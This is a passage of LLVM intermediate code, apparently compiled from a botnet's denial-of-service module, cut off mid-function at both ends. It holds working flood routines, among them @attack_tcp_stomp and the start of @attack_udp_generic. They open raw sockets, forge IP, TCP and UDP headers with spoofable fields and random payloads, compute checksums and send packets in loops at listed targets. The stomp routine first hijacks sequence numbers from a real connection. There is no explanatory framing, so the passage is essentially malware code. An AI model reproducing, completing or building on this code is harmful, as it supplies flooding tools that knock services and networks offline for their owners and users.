  %96 = getelementptr inbounds i8, i8* %89, i64 2
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %12) #10
  %99 = getelementptr inbounds i8, i8* %89, i64 4
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 4
  %101 = getelementptr inbounds i8, i8* %89, i64 8
  store i8 %14, i8* %101, align 4
  br i1 %50, label %106, label %102

; <label>:102:                                    ; preds = %87
  %103 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %104 = getelementptr inbounds i8, i8* %89, i64 6
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  br label %106

; <label>:106:                                    ; preds = %87, %102
  %107 = getelementptr inbounds i8, i8* %89, i64 9
  store i8 6, i8* %107, align 1
  %108 = getelementptr inbounds i8, i8* %89, i64 12
  %109 = bitcast i8* %108 to i32*
  store i32 %39, i32* %109, align 4
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %90, i32 1
  %111 = load i32, i32* %110, align 4
  %112 = getelementptr inbounds i8, i8* %89, i64 16
  %113 = bitcast i8* %112 to i32*
  store i32 %111, i32* %113, align 4
  %114 = call zeroext i16 @htons(i16 zeroext %18) #10
  %115 = bitcast i8* %92 to i16*
  store i16 %114, i16* %115, align 4
  %116 = call zeroext i16 @htons(i16 zeroext %20) #10
  %117 = getelementptr inbounds i8, i8* %89, i64 22
  %118 = bitcast i8* %117 to i16*
  store i16 %116, i16* %118, align 2
  %119 = call zeroext i16 @htons(i16 zeroext %51) #10
  %120 = zext i16 %119 to i32
  %121 = getelementptr inbounds i8, i8* %89, i64 24
  %122 = bitcast i8* %121 to i32*
  store i32 %120, i32* %122, align 4
  %123 = getelementptr inbounds i8, i8* %89, i64 32
  %124 = bitcast i8* %123 to i16*
  store i16 %., i16* %124, align 4
  call void @rand_str(i8* nonnull %93, i32 %35)
  %125 = load i32, i32* %5, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %5, align 4
  %127 = icmp slt i32 %126, %46
  br i1 %127, label %87, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %169
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %169
  %storemerge121128 = phi i32 [ %188, %169 ], [ 0, %.lr.ph.preheader ]
  %128 = sext i32 %storemerge121128 to i64
  %129 = getelementptr inbounds i8*, i8** %8, i64 %128
  %130 = load i8*, i8** %129, align 8
  %131 = bitcast i8* %130 to %struct.iphdr*
  %132 = getelementptr inbounds i8, i8* %130, i64 20
  %133 = getelementptr inbounds i8, i8* %130, i64 40
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #10
  %141 = call i32 @htonl(i32 %140) #10
  %142 = getelementptr inbounds i8, i8* %130, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %72, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %130, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %74, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %130, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %76, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %132 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %78, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %130, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %79, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %130, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %80, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %130, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %81, label %169, label %168

; <label>:168:                                    ; preds = %167
  call void @rand_str(i8* %133, i32 %35)
  br label %169

; <label>:169:                                    ; preds = %167, %168
  %170 = getelementptr inbounds i8, i8* %130, i64 10
  %171 = bitcast i8* %170 to i16*
  store i16 0, i16* %171, align 2
  %172 = bitcast i8* %130 to i16*
  %173 = call zeroext i16 @checksum_generic(i16* %172, i32 20) #9
  store i16 %173, i16* %171, align 2
  %174 = getelementptr inbounds i8, i8* %130, i64 36
  %175 = bitcast i8* %174 to i16*
  store i16 0, i16* %175, align 4
  %176 = call zeroext i16 @htons(i16 zeroext %84) #10
  %177 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %131, i8* %132, i16 zeroext %176, i32 %85) #9
  store i16 %177, i16* %175, align 4
  %178 = getelementptr inbounds i8, i8* %130, i64 22
  %179 = bitcast i8* %178 to i16*
  %180 = load i16, i16* %179, align 2
  %181 = load i32, i32* %5, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 0, i32 1
  store i16 %180, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %182, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %40, i8* %130, i64 %86, i32 16384, %struct.sockaddr* %185, i32 16) #9
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %46
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #9
  %12 = bitcast i8* %11 to %struct.attack_stomp_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #9
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #9
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre = sext i32 %37 to i64
  %.pre165 = add nsw i64 %.pre, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #9
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #9
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi166 = phi i64 [ %.pre165, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = add nsw i64 %.pre-phi, 20
  %90 = trunc i64 %89 to i16
  %91 = trunc i64 %89 to i32
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %92 = phi i32 [ %187, %.backedge ], [ %84, %.lr.ph161.preheader ]
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i32 0) #9
  %94 = or i32 %93, 2048
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 4, i32 %94) #9
  store i16 2, i16* %48, align 4
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 2
  %99 = load i8, i8* %98, align 4
  %100 = icmp ult i8 %99, 32
  %101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %97, i32 1
  %102 = load i32, i32* %101, align 4
  br i1 %100, label %103, label %106

; <label>:103:                                    ; preds = %.lr.ph161
  %104 = call i32 @ntohl(i32 %102) #10
  %105 = call i32 @htonl(i32 %104) #10
  br label %106

; <label>:106:                                    ; preds = %.lr.ph161, %103
  %.sink = phi i32 [ %105, %103 ], [ %102, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %109, label %107

; <label>:107:                                    ; preds = %106
  %108 = call zeroext i16 @htons(i16 zeroext %24) #10
  br label %109

; <label>:109:                                    ; preds = %106, %107
  %.sink3 = phi i16 [ %108, %107 ], [ 0, %106 ]
  store i16 %.sink3, i16* %52, align 2
  %110 = call i32 @connect(i32 %92, %struct.sockaddr* nonnull %53, i32 16) #9
  %111 = call i64 @time(i64* null) #9
  br label %112

; <label>:112:                                    ; preds = %189, %109
  store i32 16, i32* %8, align 4
  %113 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #9
  %114 = trunc i64 %113 to i32
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %.loopexit150.loopexit, label %116

; <label>:116:                                    ; preds = %112
  %117 = load i32, i32* %56, align 4
  %118 = load i32, i32* %49, align 4
  %119 = icmp eq i32 %117, %118
  br i1 %119, label %120, label %189

; <label>:120:                                    ; preds = %116
  %sext = shl i64 %113, 32
  %121 = ashr exact i64 %sext, 32
  %122 = icmp ugt i64 %121, 40
  br i1 %122, label %123, label %189

; <label>:123:                                    ; preds = %120
  %124 = load i16, i16* %58, align 4
  %125 = load i16, i16* %52, align 2
  %126 = icmp eq i16 %124, %125
  br i1 %126, label %127, label %189

; <label>:127:                                    ; preds = %123
  %128 = load i16, i16* %60, align 16
  %129 = and i16 %128, 4608
  %130 = icmp eq i16 %129, 4608
  br i1 %130, label %131, label %182

; <label>:131:                                    ; preds = %127
  %132 = load i32, i32* %5, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 0
  store i32 %117, i32* %134, align 4
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %136 = load i32, i32* %135, align 4
  %137 = call i32 @ntohl(i32 %136) #10
  %138 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 1
  store i32 %137, i32* %138, align 4
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %140 = load i32, i32* %139, align 4
  %141 = call i32 @ntohl(i32 %140) #10
  %142 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 2
  store i32 %141, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %144 = load i16, i16* %143, align 2
  %145 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 3
  store i16 %144, i16* %145, align 4
  %146 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %133, i32 4
  store i16 %124, i16* %146, align 2
  %147 = call noalias i8* @malloc(i64 %62) #9
  %148 = getelementptr inbounds i8*, i8** %14, i64 %133
  store i8* %147, i8** %148, align 8
  %149 = getelementptr inbounds i8, i8* %147, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  %151 = getelementptr inbounds i8, i8* %147, i64 40
  store i8 69, i8* %147, align 4
  %152 = getelementptr inbounds i8, i8* %147, i64 1
  store i8 %16, i8* %152, align 1
  %153 = call zeroext i16 @htons(i16 zeroext %63) #10
  %154 = getelementptr inbounds i8, i8* %147, i64 2
  %155 = bitcast i8* %154 to i16*
  store i16 %153, i16* %155, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %18) #10
  %157 = getelementptr inbounds i8, i8* %147, i64 4
  %158 = bitcast i8* %157 to i16*
  store i16 %156, i16* %158, align 4
  %159 = getelementptr inbounds i8, i8* %147, i64 8
  store i8 %20, i8* %159, align 4
  br i1 %64, label %164, label %160

; <label>:160:                                    ; preds = %131
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %162 = getelementptr inbounds i8, i8* %147, i64 6
  %163 = bitcast i8* %162 to i16*
  store i16 %161, i16* %163, align 2
  br label %164

; <label>:164:                                    ; preds = %131, %160
  %165 = getelementptr inbounds i8, i8* %147, i64 9
  store i8 6, i8* %165, align 1
  %166 = load i32, i32* @LOCAL_ADDR, align 4
  %167 = getelementptr inbounds i8, i8* %147, i64 12
  %168 = bitcast i8* %167 to i32*
  store i32 %166, i32* %168, align 4
  %169 = getelementptr inbounds i8, i8* %147, i64 16
  %170 = bitcast i8* %169 to i32*
  store i32 %117, i32* %170, align 4
  %171 = bitcast i8* %149 to i16*
  store i16 %144, i16* %171, align 4
  %172 = getelementptr inbounds i8, i8* %147, i64 22
  %173 = bitcast i8* %172 to i16*
  store i16 %124, i16* %173, align 2
  %174 = getelementptr inbounds i8, i8* %147, i64 24
  %175 = bitcast i8* %174 to i32*
  store i32 %141, i32* %175, align 4
  %176 = getelementptr inbounds i8, i8* %147, i64 28
  %177 = bitcast i8* %176 to i32*
  store i32 %137, i32* %177, align 4
  %178 = getelementptr inbounds i8, i8* %147, i64 32
  %179 = bitcast i8* %178 to i16*
  %180 = getelementptr inbounds i8, i8* %147, i64 34
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 2
  store i16 %81, i16* %179, align 4
  call void @rand_str(i8* %151, i32 %37)
  br label %.loopexit152

; <label>:182:                                    ; preds = %127
  %183 = and i16 %128, 1280
  %184 = icmp eq i16 %183, 0
  br i1 %184, label %189, label %185

; <label>:185:                                    ; preds = %182
  %186 = call i32 @close(i32 %92) #9
  br label %.backedge

.backedge:                                        ; preds = %185, %193
  %187 = call i32 @socket(i32 2, i32 1, i32 0) #9
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:189:                                    ; preds = %182, %123, %120, %116
  %190 = call i64 @time(i64* null) #9
  %191 = sub nsw i64 %190, %111
  %192 = icmp sgt i64 %191, 10
  br i1 %192, label %193, label %112

; <label>:193:                                    ; preds = %189
  %194 = call i32 @close(i32 %92) #9
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %164
  %.1 = phi %struct.tcphdr* [ %150, %164 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %195 = load i32, i32* %5, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %5, align 4
  %197 = icmp slt i32 %196, %46
  br i1 %197, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %209
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %209
  %storemerge139160 = phi i32 [ %245, %209 ], [ 0, %.lr.ph.preheader ]
  %198 = sext i32 %storemerge139160 to i64
  %199 = getelementptr inbounds i8*, i8** %14, i64 %198
  %200 = load i8*, i8** %199, align 8
  %201 = bitcast i8* %200 to %struct.iphdr*
  %202 = getelementptr inbounds i8, i8* %200, i64 20
  %203 = getelementptr inbounds i8, i8* %200, i64 40
  br i1 %87, label %204, label %207

; <label>:204:                                    ; preds = %.lr.ph
  %205 = getelementptr inbounds i8, i8* %200, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 0, i16* %206, align 4
  br label %207

; <label>:207:                                    ; preds = %204, %.lr.ph
  br i1 %88, label %209, label %208

; <label>:208:                                    ; preds = %207
  call void @rand_str(i8* %203, i32 %37)
  br label %209

; <label>:209:                                    ; preds = %207, %208
  %210 = getelementptr inbounds i8, i8* %200, i64 10
  %211 = bitcast i8* %210 to i16*
  store i16 0, i16* %211, align 2
  %212 = bitcast i8* %200 to i16*
  %213 = call zeroext i16 @checksum_generic(i16* %212, i32 20) #9
  store i16 %213, i16* %211, align 2
  %214 = load i32, i32* %5, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %215, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = add i32 %217, 1
  store i32 %218, i32* %216, align 4
  %219 = trunc i32 %217 to i16
  %220 = call zeroext i16 @htons(i16 zeroext %219) #10
  %221 = zext i16 %220 to i32
  %222 = getelementptr inbounds i8, i8* %200, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %221, i32* %223, align 4
  %224 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %215, i32 2
  %225 = load i32, i32* %224, align 4
  %226 = trunc i32 %225 to i16
  %227 = call zeroext i16 @htons(i16 zeroext %226) #10
  %228 = zext i16 %227 to i32
  %229 = getelementptr inbounds i8, i8* %200, i64 28
  %230 = bitcast i8* %229 to i32*
  store i32 %228, i32* %230, align 4
  %231 = getelementptr inbounds i8, i8* %200, i64 36
  %232 = bitcast i8* %231 to i16*
  store i16 0, i16* %232, align 4
  %233 = call zeroext i16 @htons(i16 zeroext %90) #10
  %234 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %201, i8* %202, i16 zeroext %233, i32 %91) #9
  store i16 %234, i16* %232, align 4
  %235 = getelementptr inbounds i8, i8* %200, i64 22
  %236 = bitcast i8* %235 to i16*
  %237 = load i16, i16* %236, align 2
  %238 = load i32, i32* %5, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %239, i32 0, i32 1
  store i16 %237, i16* %240, align 2
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %239, i32 0
  %242 = bitcast %struct.sockaddr_in* %241 to %struct.sockaddr*
  %243 = call i64 @sendto(i32 %40, i8* %200, i64 %.pre-phi166, i32 16384, %struct.sockaddr* %242, i32 16) #9
  %244 = load i32, i32* %5, align 4
  %245 = add nsw i32 %244, 1
  store i32 %245, i32* %5, align 4
  %246 = icmp slt i32 %245, %46
  br i1 %246, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %112
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %82
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1460
  %. = select i1 %28, i16 1460, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #9
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %146, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #9
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %41, label %.preheader84

.preheader84:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph86

.lr.ph86:                                         ; preds = %.preheader84
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %40 = zext i8 %0 to i64
  br label %57

; <label>:41:                                     ; preds = %31
  %42 = call i32 @close(i32 %29) #9
  br label %146

..preheader_crit_edge:                            ; preds = %73
  %43 = trunc i64 %indvars.iv.next to i32
  store i32 %43, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader84, %..preheader_crit_edge
  %44 = icmp eq i32 %26, -1
  %45 = and i32 %11, 65535
  %46 = icmp eq i32 %45, 65535
  %47 = and i32 %17, 65535
  %48 = icmp eq i32 %47, 65535
  %49 = and i32 %19, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = icmp eq i8 %24, 0
  %52 = zext i16 %. to i64
  %53 = add nuw nsw i64 %52, 8
  %54 = trunc i64 %53 to i32
  %55 = add nuw nsw i64 %52, 28
  %56 = zext i16 %. to i32
  br label %.loopexit

; <label>:57:                                     ; preds = %.lr.ph86, %73
  %indvars.iv = phi i64 [ 0, %.lr.ph86 ], [ %indvars.iv.next, %73 ]
  %58 = call noalias i8* @calloc(i64 1510, i64 1) #9
  %59 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %58, i8** %59, align 8
  %60 = getelementptr inbounds i8, i8* %58, i64 20
  store i8 69, i8* %58, align 4
  %61 = getelementptr inbounds i8, i8* %58, i64 1
  store i8 %10, i8* %61, align 1
  %62 = call zeroext i16 @htons(i16 zeroext %37) #10
  %63 = getelementptr inbounds i8, i8* %58, i64 2
  %64 = bitcast i8* %63 to i16*
  store i16 %62, i16* %64, align 2
  %65 = call zeroext i16 @htons(i16 zeroext %12) #10
  %66 = getelementptr inbounds i8, i8* %58, i64 4
  %67 = bitcast i8* %66 to i16*
  store i16 %65, i16* %67, align 4
  %68 = getelementptr inbounds i8, i8* %58, i64 8
  store i8 %14, i8* %68, align 4
  br i1 %38, label %73, label %69

; <label>:69:                                     ; preds = %57
  %70 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %71 = getelementptr inbounds i8, i8* %58, i64 6
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  br label %73

; <label>:73:                                     ; preds = %57, %69
  %74 = getelementptr inbounds i8, i8* %58, i64 9
  store i8 17, i8* %74, align 1
  %75 = getelementptr inbounds i8, i8* %58, i64 12
  %76 = bitcast i8* %75 to i32*
  store i32 %26, i32* %76, align 4
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %78 = load i32, i32* %77, align 4
  %79 = getelementptr inbounds i8, i8* %58, i64 16
